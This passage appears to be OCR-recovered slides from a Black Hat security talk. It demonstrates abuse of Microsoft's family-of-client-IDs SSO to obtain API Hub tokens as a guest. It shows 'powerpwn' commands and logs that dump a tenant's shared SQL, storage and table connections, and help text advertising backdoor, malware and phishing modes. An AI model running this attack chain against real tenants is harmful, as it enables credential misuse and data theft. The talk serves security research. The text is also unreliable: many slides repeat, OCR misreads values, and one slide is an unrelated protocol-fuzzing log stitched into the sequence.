- We need to find an AAD app that is: 1. On by-default 2. Pre-approved to query API Hub 3. Public client

Well, we know about the PowerApps portal!

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 138

## Solving for scope

We need to find an AAD app that is: 1. On by-default 2. Pre-approved to query API Hub 3. Public client

Well, we know about the PowerApps portal! But we can’t generate tokens on it’s behalf.

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 139

How does msft cross-app SSO work? (or – introduction to family of client IDs)

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 140

## How does msft cross-app SSO work? (or introduction to family of client IDs)

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
How does msft cross-app SSO work? (or
introduction to family of client IDs)
application_name Visual Studio Microsoft Flow
. Microsoft Planner
Office 365 Management OneDrive iOS App
Microsoft Intune Company Portal
Microsoft Azure CLI Microsoft Bing Search for Microsoft Edge
Accounts Control UI
Microsoft Azure PowerShell Microsoft Stream Mobile Native Yammer iPhone
Microsoft Teams Microsoft Teams - Device Admin Agent OneDrive
Microsoft Power BI
Windows Search Microsoft Bing Search
SharePoint
Outlook Mobile Office UWP PWA Microsoft Edge
Microsoft Authenticator App Microsoft To-Do client Microsoft Tunnel
Microsoft Edge
OneDrive SyncEngine PowerApps
SharePoint Android
Microsoft Office Microsoft Whiteboard Client
Microsoft Edge
```

## Slide 141

## How does msft cross-app SSO work? (or introduction to family of client IDs)

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
How does msft cross-app SSO work? (or
introduction to family of client IDs)
application_name Visual Studio Microsoft Flow
. Microsoft Planner
Office 365 Management OneDrive iOS App
Microsoft Intune Company Portal
Microsoft Azure CLI Microsoft Bing Search for Microsoft Edge
Accounts Control UI
Microsoft Azure PowerShell Microsoft Stream Mobile Native Yammer iPhone
Microsoft Teams Microsoft Teams - Device Admin Agent OneDrive
Microsoft Power BI
Windows Search Microsoft Bing Search
SharePoint
Outlook Mobile Office UWP PWA Microsoft Edge
Microsoft Authenticator App Microsoft To-Do client Microsoft Tunnel
Microsoft Edge
OneDrive SyncEngine PowerApps
SharePoint Android
Microsoft Office Microsoft Whiteboard Client
Microsoft Edge
```

## Slide 142

## How does msft cross-app SSO work? (or introduction to family of client IDs)

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
How does msft cross-app SSO work? (or
introduction to family of client IDs)
application_name Visual Studio Microsoft Flow
. Microsoft Planner
Office 365 Management OneDrive iOS App
Microsoft Intune Company Portal
Microsoft Azure CLI Microsoft Bing Search for Microsoft Edge
Accounts Control UI
Microsoft Azure PowerShell Microsoft Stream Mobile Native Yammer iPhone
Microsoft Teams Microsoft Teams - Device Admin Agent OneDrive
Microsoft Power BI
Windows Search Microsoft Bing Search
SharePoint
Outlook Mobile Office UWP PWA Microsoft Edge
Microsoft Authenticator App Microsoft To-Do client Microsoft Tunnel
Microsoft Edge
OneDrive SyncEngine PowerApps
SharePoint Android
Microsoft Office Microsoft Whiteboard Client
Microsoft Edge
```

## Slide 143

## Family of client IDs

### Microsoft Azure CLI

API Hub token

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 144

Exchange tokens to win We need to find an AAD app that is:

1. On by-default 2. Pre-approved to query API Hub 3. Public client

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 145

# And now for the fun part

@mbrg0

#BHUSA @BlackHatEvents

## Slide 146

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 31/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(.venv) @mbrg@:/bhusa23/all-you-need-is-guest$ powerpwn -h
| |_|
```

## Slide 147

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(.venv) @mbrg@:/bhusa23/all-you-need-is-guest$ powerpwn -h
| |
usage: powerpwn [-h] [-1 LOG_LEVEL] {dump, gui, backdoor,nocodemalware, phishing} ...
positional arguments:
{dump, gui, backdoor , nocodemalware, phishing}
command
dump Recon for available data connections and dump their content.
gui Show collected resources and data via GUI.
backdoor Install a backdoor on the target tenant
nocodemalware Repurpose trusted execs, service accounts and cloud services to power a malware operation.
phishing Deploy a trustworthy phishing app.
optional arguments:
-h, --help show this help message and exit
-1 LOG_LEVEL, --log-level LOG_LEVEL
Configure the logging level.
```

## Slide 148

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(.venv) @mbrg®@:/bhusa23/all-you-need-is-guest$ powerpwn -h
dump Recon for available data connections and dump their content.
gui Show collected resources and data via GUI.
usage backdoor Install a backdoor on the target tenant
nocodemalware Repurpose trusted execs, service accounts and cloud services to power a malware
arn phishing Deploy a trustworthy phishing app.
u
command
dump Recon for available data connections and dump their content.
gui Show collected resources and data via GUI.
backdoor Install a backdoor on the target tenant
nocodemalware Repurpose trusted execs, service accounts and cloud services to power a malware operation.
phishing Deploy a trustworthy phishing app.
optional arguments:
-h, --help show this help message and exit
-1 LOG_LEVEL, --log-level LOG_LEVEL
Configure the logging level.
```

## Slide 149

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(.venv) @mbrg@:/bhusa23/all-you-need-is-guest$ powerpwn -h
command
Recon for available data connections and dump their content.
Show collected resources and data via GUI.
usage Insta a backdoor on the target tenant
nocodemalware Repurpose trusted execs, service accounts and cloud services to power a malware
arn phishing Deploy a trustworthy phishing app.
u
command
dump Recon for available data connections and dump their content.
gui Show collected resources and data via GUI.
backdoor Install a backdoor on the target tenant
nocodemalware Repurpose trusted execs, service accounts and cloud services to power a malware operation.
phishing Deploy a trustworthy phishing app.
optional arguments:
-h, --help show this help message and exit
-1 LOG_LEVEL, --log-level LOG_LEVEL
Configure the logging level.
```

## Slide 150

#BHUSA @BlackHatEvents

## Slide 151

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
2023-07-28 11:00:52 | powerpwn |
token.
2023-07-28 11:00:52 | powerpwn |
2023-07-28 11:00:52 | powerpwn |
To sign in, use a web browser to
|
INFO | Acquiring token with scope=https://service.powerapps.com/.default from cached refresh
INFO | Failed to acquire with refresh token. Fallback to device-flow
INFO | Acquiring token with scope=https://service.powerapps.com/.default.
open the page https://microsoft.com/devicelogin and enter the code DPCLTUC23 to authenticate
```

## Slide 152

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(.venv) @mbrg@: /bhusa23/all-you-need-is-guest$ powerpwn dump -t fc993b0f-345b-4d01-9f67-9ac4a140dd43
| |
2023-07-28 11:00:52 | powerpwn | INFO | Acquiring token with scope=https://service.powerapps.com/.default from cached refresh
token.
2023-07-28 11:00:52 | powerpwn |
2023-07-28 11:00:52 | powerpwn |
To sign in, use a web browser to
to authenticate
```

## Slide 153

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
2023-07-28 11:00:52 | powerpwn |
token.
2023-07-28 11:00:52 | powerpwn |
2023-07-28 11:00:52 | powerpwn |
To sign in, use a web browser to
| ._/ \/J/\/ I.
|
INFO | Acquiring token with scope=https://service.powerapps.com/.default from cached refresh
INFO | Failed to acquire with refresh token. Fallback to device-flow
INFO | Acquiring token with scope=https://service.powerapps.com/.default.
open the page https://microsoft.com/devicelogin [and enter the code DPCLTUC23 to authenticate
```

## Slide 154

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 96/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Microsoft
Enter code
Enter the code displayed on your app or device.
```

## Slide 155

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 96/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Microsoft Azure
Microsoft
Pick an account
You're signing in to Microsoft Azure Cross-
platform Command Line Interface on another
device located in Israel. If it's not you, close this
page.
Hacker5
Signed in
+ Use another account
Back
```

## Slide 156

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 96/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Microsoft Azure
Microsoft
Are you trying to sign in to
Microsoft Azure CLI?
Only continue if you downloaded the app from a
store or website that you trust.
Cancel Continue
```

## Slide 157

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 96/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Microsoft
Microsoft Azure Cross-platform
Command Line Interface
You have signed in to the Microsoft Azure Cross-
platform Command Line Interface application on
your device. You may now close this window
```

## Slide 158

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
2023-07-28 11:00:52 | powerpwn |
token.
2023-07-28 11:00:52 | powerpwn |
2023-07-28 11:00:52 | powerpwn |
To sign in, use a web browser to
|
INFO | Acquiring token with scope=https://service.powerapps.com/.default from cached refresh
INFO | Failed to acquire with refresh token. Fallback to device-flow
INFO | Acquiring token with scope=https://service.powerapps.com/.default.
open the page https://microsoft.com/devicelogin and enter the code DPCLTUC23 to authenticate
```

## Slide 159

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
|
|_|
/ |
2023-07-28 11:00:52 |
token.
2023-07-28 11:00:52 |
2023-07-28 11:00:52 |
To sign in, use a web
2023-07-28 11:02:49 |
2023-07-28 11:02:49 |
2023-07-28 11:02:51 |
2023-07-28 11:03:06 |
2023-07-28 11:03:07 |
powerpwn | INFO
powerpwn | INFO
powerpwn | INFO
browser to open
powerpwn | INFO
powerpwn | INFO
powerpwn | INFO
powerpwn | INFO
140dd43
powerpwn | INFO
c4a140dd43
| Acquiring token with scope=https://service.powerapps.com/.default from cached refresh
| Failed to acquire with refresh token. Fallback to device-flow
| Acquiring token with scope=https://service.powerapps.com/.default.
the page https://microsoft.com/devicelogin and enter the code DPCLTUC23 to authenticate
| Access token for https://service.powerapps.com/.default acquired successfully
| Token is cached in /mnt/c/Users/bargu/source/mbrg/power-pwn/tokens. json
| Found 1 environments.
| Found 6 widely shared canvas apps out of 6 canvas apps in environment Deg
| Found 9 active shareable connections out of 9 connections in environment
```

## Slide 160

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(.venv) @mbrg@:/bhusa23/all-you-need-is-guest$ powerpwn dump -t fc993b0f-345b-4d01-9f67-9ac4a14@dd43
|_|
2023-07-28 11:00:52 | powerpwn |
token.
2023-07-28 11:00:52 | powerpwn |
2023-07-28 11:00:52 | powerpwn |
To sign in, use a web browser to
2023-07-28 11:02:49 | powerpwn |
2023-07-28 11:02:49 | powerpwn |
2023-07-28 11:02:51 | powerpwn |
2023-07-28 11:03:06 | powerpwn |
2023-07-28 11:03:07 | powerpwn |
INFO | Acquiring token with scope=https://service.powerapps.com/.default from cached refresh
INFO | Failed to acquire with refresh token. Fallback to device-flow
INFO | Acquiring token with scope=https://service.powerapps.com/.default.
open the page https://microsoft.com/devicelogin and enter the code DPCLTUC23 to authenticate
INFO
INFO cs
INFO | Found 1 environments.
INFO | Found 6 widely shared canvas apps out of 6 canvas apps in environment Deg
INFO | Found 9 active shareable connections out of 9 connections in environment
```

## Slide 161

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(.venv) @mbrg@:/bhusa23/all-you-need-is-guest$ powerpwn dump -t fc993b@f-345b-4d01-9f67-9ac4a14@dd43
|_|
2023-07-28 11:00:52 | powerpwn |
token.
2023-07-28 11:00:52 | powerpwn |
2023-07-28 11:00:52 | powerpwn |
To sign in, use a web browser to
2023-07-28 11:02:49 | powerpwn |
2023-07-28 11:02:49 | powerpwn |
2023-07-28 11:02:51 | powerpwn |
2023-07-28 11:03:06 | powerpwn |
2023-07-28 11:03:07 | powerpwn |
a
|
INFO | Acquiring token with scope=https://service.powerapps.com/.default from cached refresh
INFO | Failed to acquire with refresh token. Fallback to device-flow
INFO | Acquiring token with scope=https://service.powerapps.com/.default.
open the page https://microsoft.com/devicelogin and enter the code DPCLTUC23 to authenticate
INFO | Access token for https://service.powerapps.com/.default acquired successfully
INFO i i i
INFO Found 1 environments.
INFO §| Found 6 widely shared canvas apps out of 6 canvas apps in environment De@
INFO Found 9 active shareable connections out of 9 connections in environment fc99
```

## Slide 162

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
2023-07-28 11:03:07 | powerpwn | INFO | Fetching OpenAPI spec for connector shared_azureblob.
2023-07-28 11:03:08 | powerpwn | INFO | Fetching OpenAPI spec for connector shared_azurefile.
2023-07-28 11:03:08 | powerpwn | INFO | Fetching OpenAPI spec for connector shared_azurequeues.
| |
2023-07-28 11:03:09 | powerpwn | INFO | Fetching OpenAPI spec for connector shared_azuretables.
2023-07-28 11:03:09 | powerpwn | INFO | Fetching OpenAPI spec for connector shared_sql.
2023-07-28 11:03:1@ | powerpwn | INFO | Fetching OpenAPI spec for connector shared_logicflows.
2023-07-28 11:03:10 | powerpwn | INFO | Acquiring token with scope=https://apihub.azure.com/.default from cached refresh toke
ne
2023-07-28 11:03:11 | powerpwn | INFO | Token for https://apihub.azure.com/.default acquired from refresh token successfully.
2023-07-28 11:03:11 | powerpwn | INFO | Token is cached in /mnt/c/Users/bargu/source/mbrg/power-pwn/tokens. json
2023-07-28 11:03:24 | powerpwn | INFO | Dump is completed in .cache
(.venv) @mbrg®@: /bhusa23/all-you-need-is-guest$
```

## Slide 163

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
2023-07-28 11:03:07 | powerpwn | INFO | Fetching OpenAPI spec for connector shared_azureblob.
2023-07-28 11:03:08 | powerpwn | INFO | Fetching OpenAPI spec for connector shared_azurefile.
2023-07-28 11:03:08 | powerpwn | INFO | Fetching OpenAPI spec for connector shared_azurequeues.
| |
2023-07-28 11:03:09 | powerpwn | INFO | Fetching OpenAPI spec for connector shared_azuretables.
2023-07-28 11:03:09 | powerpwn | INFO | Fetching OpenAPI spec for connector shared sql -
2023-07-28 11:03:10 | powerpwn | INFO | Fetching OpenAPI spe en=connescter ned =
2023-07-28 11:03:18 | powerpwn | INFO | Acquiring token with scope= “https: / /apihub. azure.com/.default ‘from cached refresh toke
n.
2023-07-28 11:03:11 | powerpwn | INFO | Token for https://apihub.azure.com/.default acquired from refresh token successfully.
2023-07-28 11:03:11 | powerpwn | INFO | Token is cached in /mnt/c/Users/bargu/source/mbrg/power-pwn/tokens. json
2023-07-28 11:03:24 | powerpwn | INFO | Dump is completed in .cache
(.venv) @mbrg®@: /bhusa23/all-you-need-is-guest$
```

## Slide 164

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
2023-07-28 11:03:07 | powerpwn | INFO § Fetching OpenAPI connector shared_azureblob.
2023-07-28 11:03:08 | powerpwn | INFO |] Fetching OpenAPI connector shared_azurefile.
2023-07-28 11:03:08 | powerpwn | INFO }]| Fetching OpenAPI connector shared_azurequeues.
2023-07-28 11:03:09 | powerpwn | INFO |] Fetching OpenAPI connector shared_azuretables.
2023-07-28 11:03:09 | powerpwn | INFO |] Fetching OpenAPI connector shared_sql.
2023-07-28 11:03:10 | powerpwn | INFO \ Fetching OpenAPI connector shared logicflows.
2023-07-28 11:03:10 | powerpwn | INFO | Acquiring token with scope=https://apihub.azure.com/.default from cached refresh toke
n.
2023-07-28 11:03:11 | powerpwn | INFO | Token for https://apihub.azure.com/.default acquired from refresh token successfully.
2023-07-28 11:03:11 | powerpwn | INFO | Token is cached in /mnt/c/Users/bargu/source/mbrg/power-pwn/tokens. json
2023-07-28 11:03:24 | powerpwn | INFO | Dump is completed in .cache
(.venv) @mbrg®@: /bhusa23/all-you-need-is-guest$
```

## Slide 165

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
2023-07-28 11:03:07 | powerpwn | INFO | Fetching OpenAPI spec for connector shared_azureblob.
2023-07-28 11:03:08 | powerpwn | INFO | Fetching OpenAPI spec for connector shared_azurefile.
2023-07-28 11:03:08 | powerpwn | INFO | Fetching OpenAPI spec for connector shared_azurequeues.
|
| |
| |
2023-07-28 11:03:09 | powerpwn | INFO Fetching OpenAPI spec for connector shared_azuretables.
| |
| |
| |
2023-07-28 11:03:09 | powerpwn | INFO | Fetching OpenAPI spec for connector shared_sql.
2023-07-28 11:03:1@ | powerpwn | INFO | Fetching OpenAPI spec for connector shared_logicflows.
2023-07-28 11:03:10 | powerpwn | INFO | Acquiring token with scope=https://apihub.azure.com/.default from cached refresh toke
n.
2023-07-28 11:03:11 | powerpwn | INFO | Token for https: //apihub. azure.com/.default acquired from refresh token successfully.
| Dump is completed in .cache
2023-07-28 11:03:24 | powerpwn | INFO
```

## Slide 166

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 77/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(.venv) @mbrg@: /bhusa23/all-you-need-is-guest$ ls -.cache
```

## Slide 167

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 79/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(.venv) @mbrg@: /bhusa23/all-you-need-is-guest$ ls -.cache
resources
(.venv) @mbrg@:/bhusa23/all-you-need-is-guest$ ls .cache/resources/Default -fc993b@Ff -345b-4d01-9f67 -9ac4a140dd43/connector/
shared_azureblob.json shared_flowmanagement.json shared_office365users.json shared_twitter.json
shared_azurefile.json shared_ftp.json shared_outlooktasks.json shared_yammer.json
shared_commondataserviceforapps.json shared_office365.json shared_sql.json
```

## Slide 168

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 77/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(.venv) @mbrg@: /bhusa23/all-you-need-is-guest$ ls -.cache
shared_azureblob.json shared_flowmanagement.json shared_office365users.json shared_twitter.json
shared_azurefile.json shared_ftp.json shared_outlooktasks.json shared_yammer.json
shared_commondataserviceforapps.json shared_office365.json shared_sql.json
(.venv) @mbrg@:/bhusa23/all-you-need-is-guest$ ls .cache/data/Default -fc993b0f -345b-4d01-9f67-9ac4a140dd43/connections/shared
default-Customers.json default-sys.database firewall _rules.json default-sys.ipv6 database firewall_rules.json
(.venv) @mbrg@:/bhusa23/all-you-need-is-guest$
```

## Slide 169

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 63/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(.venv) @mbrg@:/bhusa23/all-you-need-is-guest$ powerpwn gui
|
|
| |
2023-07-28 11:06:13 | powerpwn | INFO | Application is running on http://127.0.0.1:5000
* Serving Flask app ‘powerpwn.powerdump.gui.gui'
* Debug mode: off
```

## Slide 170

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
powerpwn - Applications
e All Resources
© Credentials
e Automations
e Applications
© Connectors
Display name Environment Version Created by Created at Last modified at
Customer Insights Default- 2022-07- jamier@zenitydemo.onmicrosoft.com 2022-07-14 2023-07-11
4d01-9f67-
9ac4a140dd43
Shoutout Default- 2023-07- jamier@zenitydemo.onmicrosoft.com 2023-07-29 2023-07-30
4d01-9f67-
9ac4a140dd43
lanasapp Default- 2023-07- lanas@zenity.io 2023-07-23 2023-07-23
4d01-9f67-
0
=
=
70
=
```

## Slide 171

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
powerpwn - Applications
e Applications
e Connectors
Display name Environment Version Created by Created at Last modified at
Customer Insights Default- 2022-07- jamier@zenitydemo.onmicrosoft.com 2022-07-14 2023-07-11
4d01-9f67-
9ac4a140dd43
Shoutout Default- 2023-07- jamier@zenitydemo.onmicrosoft.com 2023-07-29 2023-07-30
4d01-9f67-
9ac4a140dd43
lanasapp Default- 2023-07- lanas@zenity.io 2023-07-23 2023-07-23
4d01-9f67-
0
=
=
70
=
```

## Slide 172

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 83/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
powerpwn - Credentials
All Resources
Credentials
Automations
e Applications
e Connectors
Connector Connection Created by
shared _azurefile jamieredingcustomerdata.file.core.windows.net jamier@zenitydemo.onmicrosoft.com
shared azureblob https://enterpriseip.blob.core.windows.net/patentarchive jamier@zenitydemo.onmicrosoft.com
f shared azuretables jamieredingcustomerdata.table.core.windows.net/customers jamier@zenitydemo.onmicrosoft.com
shared azurequeues Azure Queues jamier@zenitydemo.onmicrosoft.com
BH sshared sql enterprisefinancial financialreports.database.windows.net hi@pwntoso.onmicrosoft.com
shared sql enterprisecustomers jamier@zenitydemo.onmicrosoft.com
customercareinsights.database.windows.net
Playground Raw Dump
Playground Raw Dump
Playground Raw Dump
Playground Raw Dump
Raw Dump
Playground
```

## Slide 173

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
powerpwn - Credentials
All Resources
Credentials
Automations
Applications
Connectors
Connector
Connection
Created by
shared
azureblob
shared
azuretables
shared
azurequeues
shared
sql
https://enterpriseip.blob.core.windows.net/patentarchive
jamieredingcustomerdata.table.core.windows.net/customers
Azure Queues
enterprisefinancial financialreports.database.windows.net
enterprisecustomers
customercareinsights.database.windows.net
jamier@zenitydemo.onmicrosoft.com
jamier@zenitydemo.onmicrosoft.com
jamier@zenitydemo.onmicrosoft.com
jamier@zenitydemo.onmicrosoft.com
hi@pwntoso.onmicrosoft.com
jamier@zenitydemo.onmicrosoft.com
Playground Raw Dump
Playground Raw Dump
Playground Raw Dump
Playground Raw Dump
Playground
```

## Slide 174

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 83/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
powerpwn - Credentials
e All Resources
e Automations
e Applications
© Connectors
Connector Connection Created by
shared _azurefile jamieredingcustomerdata.file.core.windows.net jamier@zenitydemo.onmicrosoft.com Playground Raw
shared azureblob https://enterpriseip.blob.core.windows.net/patentarchive jamier@zenitydemo.onmicrosoft.com Playground Raw | Dump
f shared azuretables jamieredingcustomerdata.table.core.windows.net/customers jamier@zenitydemo.onmicrosoft.com Playground Raw | Dump
shared azurequeues Azure Queues jamier@zenitydemo.onmicrosoft.com Playground Raw
Dump
BH sshared sql enterprisefinancial financialreports.database.windows.net hi@pwntoso.onmicrosoft.com Playground
shared sql enterprisecustomers jamier@zenitydemo.onmicrosoft.com Playgroun
customercareinsights.database.windows.net
```

## Slide 175

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 67/100 on the text kept, 55/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
cache / data / Defaullt-fe93b0t-345b=4 ela /
|$ Mimetype Modified
```

## Slide 176

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 71/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
«cache / data / Defaullt-f993b0f-345b-4d01-9167-9ac4al4odd4s /
table
Name 1} Mimetype Modified Size
[) default-Customers.json application/json 2023.07.28 11:09:35 23.92 KiB
DC default-sys.database_ firewall rules.json application/json 2023.07.28 11:09:35 2B
C) default-sys.ipv6 database firewall _rules.json Gg application/json 2023.07.28 11:09:36 2B
```

## Slide 177

#BHUSA @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 70/100 on the text kept, 60/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
FUZZ MODE

- Custom mutation primitives.
- Easy to extend.
- Auto-crash detection

[terminal panel - ariel.harush]
[illegible - one line clipped by the panel header]
2023-06-18 03:40:27,374 cp -> pd:
b'5318070000602e5319070000602d531a070000602c531b070000602b531c070000602a531d0700006029531e0700006028531f070000602753200700006026532107000060255322070[cut off by slide edge]
00601e5329070000601d532a070000601c532b070000601b532c070000601a532d0700006019532e0700006018532f07000060175330070000601653310700006015533207000060145333[cut off by slide edge]
2023-06-18 03:40:27,425 cp -> pd: b'53360700006010'
2023-06-18 03:40:27,446 pd -> cp: b'538f10000450a0c9538f08000440ffcb' (original:b'538f08000440a0c9538f08000440a0c9') applied mutation message_code_50
2023-06-18 03:40:27,492 pd -> cp: b'538f10000450a0c9538f08000440ffcb' (original:b'538f08000440a0c9538f08000440a0c9') applied mutation message_code_50
2023-06-18 03:40:27,538 pd -> cp: b'538f18000450a0c9538f08000440a0c9538f0800044098e6' (original:b'538f08000440a0c9538f08000440a0c9538f08000440a0c9') ap[cut off by slide edge]
2023-06-18 03:40:27,583 pd -> cp: b'538f10000450a0c9538f08000440ffcb' (original:b'538f08000440a0c9538f08000440a0c9') applied mutation message_code_50
2023-06-18 03:40:27,629 pd -> cp: b'538f10000450a0c9538f08000440ffcb' (original:b'538f08000440a0c9538f08000440a0c9') applied mutation message_code_50
2023-06-18 03:40:27,675 pd -> cp: b'538f18000450a0c9538f08000440a0c9538f0800044098e6' (original:b'538f08000440a0c9538f08000440a0c9538f08000440a0c9') ap[cut off by slide edge]
2023-06-18 03:40:27,721 pd -> cp: b'538f10000450a0c9538f08000440ffcb' (original:b'538f08000440a0c9538f08000440a0c9') applied mutation message_code_50
2023-06-18 03:40:27,767 pd -> cp: b'538f10000450a0c9538f08000440ffcb' (original:b'538f08000440a0c9538f08000440a0c9') applied mutation message_code_50
2023-06-18 03:40:27,813 pd -> cp: b'538f10000450a0c9538f08000440ffcb' (original:b'538f08000440a0c9538f08000440a0c9') applied mutation message_code_50
2023-06-18 03:40:27,859 pd -> cp: b'538f18000450a0c9538f08000440a0c9538f0800044098e6' (original:b'538f08000440a0c9538f08000440a0c9538f08000440a0c9') ap[cut off by slide edge]
2023-06-18 03:40:27,905 pd -> cp: b'538f10000450a0c9538f08000440ffcb' (original:b'538f08000440a0c9538f08000440a0c9') applied mutation message_code_50
2023-06-18 03:40:27,951 pd -> cp: b'538f10000450a0c9538f08000440ffcb' (original:b'538f08000440a0c9538f08000440a0c9') applied mutation message_code_50
2023-06-18 03:40:27,996 pd -> cp: b'538f18000450a0c9538f08000440a0c9538f0800044098e6' (original:b'538f08000440a0c9538f08000440a0c9538f08000440a0c9') ap[cut off by slide edge]
2023-06-18 03:40:28,046 pd -> cp: b'538f0800045091db' (original:b'538f08000440a0c9') applied mutation message_code_50
2023-06-18 03:48:11,022 ***** crash detected timeout: 462.97612953186035

[code panel - ariel.harush]
def pri_invert_control_SCB(msg: OSDPMessage):
    msg.CTRL_SCB = not msg.CTRL_SCB
    msg.recalculate_all()
```

## Slide 178

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 70/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ache / data / Defaullt-feO93b0t
/ Shared_sql
Name 14 Mimetype Modified Size
BE 009f5ad0908a497f8abeeaaa8efcS692 inode/directory 2023.07.28 11:09:31
Ba ££47194e357e459b8756a5£43£59ccc6 inode/directory 2023.07.28 11:09:35
```

## Slide 179

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 80/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
powerpwn - Credentials
All Resources
Credentials
Automations
Playground
Playground | Raw Dump
Playground | Raw Dump
Playground |} Raw Dump
e Applications
e Connectors
Connector Connection Created by
shared _azurefile jamieredingcustomerdata.file.core.windows.net jamier@zenitydemo.onmicrosoft.com
shared azureblob https://enterpriseip.blob.core.windows.net/patentarchive jamier@zenitydemo.onmicrosoft.com
f shared azuretables jamieredingcustomerdata.table.core.windows.net/customers jamier@zenitydemo.onmicrosoft.com
shared azurequeues Azure Queues jamier@zenitydemo.onmicrosoft.com
BH sshared sql enterprisefinancial financialreports.database.windows.net hi@pwntoso.onmicrosoft.com
shared sql enterprisecustomers jamier@zenitydemo.onmicrosoft.com
customercareinsights.database.windows.net
```

## Slide 180

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
® Swagger /api/shared_sql/ff47194e357e459b8756a5f43f59ccc6/swagger.json
Supported by SMARTBEAR
SQL Server@
[ Base URL: europe-002.azure-apim.net/apim/sql ]
Microsoft SQL Server is a relational database management system developed by Microsoft. Connect to SQL Server to manage data. You can perform various actions such as create, update,
